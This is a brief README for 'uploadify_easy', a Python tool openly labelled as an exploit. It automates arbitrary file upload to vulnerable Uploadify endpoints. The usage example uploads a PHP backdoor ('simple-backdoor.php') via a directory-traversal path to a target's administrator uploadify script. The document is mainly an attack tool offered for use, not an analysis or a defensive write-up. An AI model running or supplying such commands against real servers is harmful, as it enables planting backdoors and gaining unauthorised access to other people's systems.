# uploadify_easy
_exploit_

The purpose of this tool is to automate the upload process in case there is a utility on an uploadify server. It could be considered as an exploit since it allows you to upload files to any system path by writing to it.


## Usage
```python3 uploadify_easy.py File2Upload RemotePath TargetUrl```
### Example
``` python3 uploadify_easy.py simple-backdoor.php ../../../../../../../tmp/ http://<target>/administrator/js/uploadify/uploadify.php ```
